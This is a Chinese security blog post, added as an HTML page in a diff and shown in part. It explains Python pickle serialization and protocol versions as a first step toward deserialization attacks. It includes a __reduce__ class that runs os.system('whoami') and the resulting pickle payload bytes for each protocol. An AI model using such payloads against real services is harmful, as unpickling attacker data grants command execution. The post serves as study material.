@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
+    <meta name="description" content="二话不说先宏观理解 FROM java安全漫谈反序列化(1):Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序(rce)所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加危险   相比于 PHP 反序列化必须要依赖于当前代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python反序列化1_初识利用手法">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="二话不说先宏观理解 FROM java安全漫谈反序列化(1):Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序(rce)所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加危险   相比于 PHP 反序列化必须要依赖于当前代码">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/pvm_structure.png">
+<meta property="article:published_time" content="2024-11-16T06:40:20.688Z">
+<meta property="article:modified_time" content="2024-11-28T14:15:56.681Z">
+<meta property="article:tag" content="Python安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/pvm_structure.png">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
+      
+    <!-- title -->
+    <title>python反序列化1_初识利用手法</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
+
+ <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+     
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/17/Java%E5%AE%89%E5%85%A85(4)_CC1_LazyMap/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/16/Java%E5%AE%89%E5%85%A85(3)_CC1_TransformedMap/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&text=python反序列化1_初识利用手法"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&is_video=false&description=python反序列化1_初识利用手法"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python反序列化1_初识利用手法&body=Check out this article: https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&title=python反序列化1_初识利用手法"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&name=python反序列化1_初识利用手法&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/&t=python反序列化1_初识利用手法"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%AF%9D%E4%B8%8D%E8%AF%B4%E5%85%88%E5%AE%8F%E8%A7%82%E7%90%86%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">二话不说先宏观理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E5%BA%93%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">pickle库序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.</span> <span class="toc-text">不同版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%8D%8F%E8%AE%AE%E7%89%88%E6%9C%AC%E4%B8%8E%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">pickle协议版本与关键函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E6%93%8D%E4%BD%9C%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E8%A7%84%E5%88%99"><span class="toc-number">2.3.</span> <span class="toc-text">可操作对象基本规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%81%E5%AD%98%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB%E7%9A%84%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.4.</span> <span class="toc-text">*封存函数与类的实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#opcode%E4%B8%8EPVM"><span class="toc-number">3.</span> <span class="toc-text">opcode与PVM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PVM%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.</span> <span class="toc-text">PVM的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E4%BE%8B%E5%AD%90%E7%90%86%E8%A7%A3opcode"><span class="toc-number">3.2.</span> <span class="toc-text">从例子理解opcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%EF%BC%9Apickle%E6%BA%90%E7%A0%81%E4%B8%AD%E7%9A%84opcode"><span class="toc-number">3.3.</span> <span class="toc-text">进阶：pickle源码中的opcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95RCE"><span class="toc-number">4.</span> <span class="toc-text">pickle进行简单RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-reduce"><span class="toc-number">4.1.</span> <span class="toc-text">利用__reduce__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%90%93opcode"><span class="toc-number">4.2.</span> <span class="toc-text">手搓opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pickletools%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.1.</span> <span class="toc-text">pickletools分析方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#R%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.2.2.</span> <span class="toc-text">R操作符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#i%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.2.3.</span> <span class="toc-text">i操作符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#o%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.2.4.</span> <span class="toc-text">o操作符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.2.5.</span> <span class="toc-text">b操作符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getstate-%E5%92%8C-setstate"><span class="toc-number">4.2.5.1.</span> <span class="toc-text">__getstate__和__setstate__</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#b-payload"><span class="toc-number">4.2.5.2.</span> <span class="toc-text">b_payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Marshel%E8%BF%9B%E8%A1%8CRCE"><span class="toc-number">5.</span> <span class="toc-text">Marshel进行RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PyYAML%E8%BF%9B%E8%A1%8CRCE"><span class="toc-number">6.</span> <span class="toc-text">PyYAML进行RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">7.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        python反序列化1_初识利用手法
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-16T06:40:20.688Z" class="dt-published" itemprop="datePublished">2024-11-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Python%E5%AE%89%E5%85%A8/" rel="tag">Python安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="二话不说先宏观理解"><a href="#二话不说先宏观理解" class="headerlink" title="二话不说先宏观理解"></a>二话不说先宏观理解</h2><blockquote>
+<p>FROM java安全漫谈反序列化(1):<br>Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序(rce)<br>所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加危险</p>
+</blockquote>
+<ol>
+<li>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象，这样的话就大大拓宽了我们的攻击面</li>
+</ol>
+<h2 id="pickle库序列化"><a href="#pickle库序列化" class="headerlink" title="pickle库序列化"></a>pickle库序列化</h2><h3 id="不同版本"><a href="#不同版本" class="headerlink" title="不同版本"></a>不同版本</h3><ol>
+<li><p>python为我们提供了两个比较重要的库pickle 和 cpickle，后者是底层使用c语言书写，速度是pickle的1000倍，但是接口相同</p>
+</li>
+<li><p>编写两个脚本</p>
+<ol>
+<li>我们可以看到python3与python2版本序列化出的字符串是不同的，这里<strong>着重python3的</strong></li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3版本 vsc运行</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="comment"># 1. 输出序列化</span></span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(<span class="built_in">list</span>,protocol=<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 2. 输入反序列化</span></span><br><span class="line"><span class="comment"># 2. 1 文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kc1zs4/Code/CTF/Learned/PyPickle/pickleTest_1.pkl&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(<span class="built_in">list</span>,f,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 2. 2 b字符串</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(<span class="string">b&#x27;(lp0\nVa\np1\naVb\np2\naVc\np3\naVd\np4\na.&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># python2版本 python2 ./py2PickleTest.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(<span class="built_in">list</span>,protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kc1zs4/Code/CTF/Learned/PyPickle/pickleTest_py2_1.pkl&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f: </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="pickle协议版本与关键函数"><a href="#pickle协议版本与关键函数" class="headerlink" title="pickle协议版本与关键函数"></a>pickle协议版本与关键函数</h3><ol>
+<li><p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.11/library/pickle.html">极致官方文档</a></p>
+</li>
+<li><p><strong>关于协议</strong></p>
+<ol>
+<li><p>Pickle 协议版本是自动检测出来的，所以不需要参数来指定协议。封存对象以外的其他字节将被忽略</p>
+</li>
+<li><p>pickle协议是向前兼容的，同时python高等级的协议需要越高版本才可以用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新</p>
+<table>
+<thead>
+<tr>
+<th>小小解读</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python</td>
+</tr>
+<tr>
+<td>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容</td>
+</tr>
+<tr>
+<td>第 2 版协议是在 Python 2.3 中引入的。 它为 新式类 提供了更高效的封存机制。 请参考 PEP 307 了解第 2 版协议带来的改进的相关信息</td>
+</tr>
+<tr>
+<td>v3 版协议是在 Python 3.0 中引入的。 它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议</td>
+</tr>
+<tr>
+<td>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。它是Python 3.8使用的默认协议。有关第 4 版协议带来改进的信息，请参阅 PEP 3154</td>
+</tr>
+<tr>
+<td>第 5 版协议是在 Python 3.8 中加入的。 它增加了对带外数据的支持，并可加速带内数据处理。 请参阅 PEP 574 了解第 5 版协议所带来的改进的详情</td>
+</tr>
+</tbody></table>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;KC1zs4&#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] pickle v&#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), pickle.dumps(demo, protocol=i)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同的表现，看一下，可以认出来</span></span><br><span class="line">[+] pickle v0: <span class="string">b&#x27;cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line">[+] pickle v1: <span class="string">b&#x27;cposix\nsystem\nq\x00(X\x06\x00\x00\x00whoamiq\x01tq\x02Rq\x03.&#x27;</span></span><br><span class="line">[+] pickle v2: <span class="string">b&#x27;\x80\x02cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#x27;</span></span><br><span class="line">[+] pickle v3: <span class="string">b&#x27;\x80\x03cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#x27;</span></span><br><span class="line">[+] pickle v4: <span class="string">b&#x27;\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">[+] pickle v5: <span class="string">b&#x27;\x80\x05\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在python3中</p>
+<ol>
+<li>在 3.0 版本发生变更: 默认协议版本是 3</li>
+<li>在 3.8 版本发生变更: 默认协议版本是 4</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>这里解读关键的函数</p>
+<ol>
+<li>各个有无s的区别在于数据的形式是否为bytes</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dump</td>
+<td>对象反序列化到文件对象并存入文件</td>
+</tr>
+<tr>
+<td>dumps</td>
+<td>对象反序列化为 bytes 对象</td>
+</tr>
+<tr>
+<td>load</td>
+<td>对象反序列化并从文件中读取数据</td>
+</tr>
+<tr>
+<td>loads</td>
+<td>从 bytes 对象反序列化</td>
+</tr>
+</tbody></table>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # # # 1. 序列化对象 # # # # # #</span></span><br><span class="line">    <span class="comment"># 将对象 obj 封存以后的对象写入已打开的 file object file</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># 将 obj 封存以后的对象作为 bytes 类型直接返回，而不是将其写入到文件</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # # 2. 反序列化 # # # # # #</span></span><br><span class="line">    <span class="comment"># 从已打开的 file object 文件 中读取封存后的对象，重建其中特定对象的层次结构并返回</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># 重建并返回一个对象的封存表示形式 data 的对象层级结构。 data 必须为 bytes-like object</span></span><br><span class="line">    <span class="comment"># 这包括所有 bytes、bytearray 和 array.array 对象，以及许多普通 memoryview 对象</span></span><br><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)¶</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="可操作对象基本规则"><a href="#可操作对象基本规则" class="headerlink" title="可操作对象基本规则"></a>可操作对象基本规则</h3><ol>
+<li><p>列出来</p>
+<ol>
+<li><strong>异常处理</strong>: 异常发生时，可能有部分字节已经被写入指定文件中<ol>
+<li>尝试封存不能被封存的对象会抛出 PicklingError 异常</li>
+<li>超出最大递归层级限制，此时会抛出 RecursionError 异常</li>
+</ol>
+</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">内置常量 (<span class="literal">None</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">Ellipsis</span> 和 <span class="literal">NotImplemented</span>)；</span><br><span class="line"></span><br><span class="line">整数、浮点数、复数;</span><br><span class="line"></span><br><span class="line">字符串、字节串、字节数组;</span><br><span class="line"></span><br><span class="line">只包含可封存对象的元组、列表、集合和字典;</span><br><span class="line"></span><br><span class="line">可在模块最高层级上访问的（内置与用户自定义的）函数（使用 <span class="keyword">def</span>，而不是使用 <span class="keyword">lambda</span> 定义）;</span><br><span class="line"></span><br><span class="line">可在模块最高层级上访问的类;</span><br><span class="line">    这种类的实例调用 __getstate__() 的结果是可 pickle 的（请参阅 封存类实例 一节了解详情）</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="封存函数与类的实例"><a href="#封存函数与类的实例" class="headerlink" title="*封存函数与类的实例"></a>*封存函数与类的实例</h3><ol>
+<li><p>在python官方文档中有这样两句话</p>
+<blockquote>
+<ol>
+<li>请注意（内置与用户自定义的）函数是按完整 qualified name，而不是按值来封存的。 [2] 这意味着只会封存函数名称，以及包含它的模块和类名称。 函数的代码，以及函数的属性都不会被封存。 因而定义它的模块在解封环境中必须可以被导入，并且模块必须包含所命名的对象，否则将会引发异常。 [3]</li>
+<li>类似地，类也是按完整限定名称来封存的，因此在解封环境中也会应用相同的限制。 请注意类的代码或数据都不会被封存，因此在下面的示例中类属性 attr 不会在解封环境中被恢复<br>进行整理一下</li>
+</ol>
+</blockquote>
+<ol>
+<li>函数封存：<ol>
+<li>pickle会记录函数的完整限定名称，包括函数名、所在的模块名以及如果有的话，所在类的名称。</li>
+<li>函数的实际代码和属性不会被封存。</li>
+<li>在解封时，必须能够从相同的位置（即相同的模块中）找到该函数定义；否则，解封过程将失败。</li>
+</ol>
+</li>
+<li>类封存：<ol>
+<li>类同样按照其完整限定名称进行封存，而不是其内容或状态。</li>
+<li>类的代码及其数据成员不会被封存。注意这里是类的而不是实例的</li>
+<li>如果尝试解封一个类实例，那么在解封环境中也必须可以导入这个类，并且该类需要存在于预期的模块中。任何类级别的属性或方法都不会自动恢复。</li>
+</ol>
+</li>
+<li><strong>总的来说就是</strong><ol>
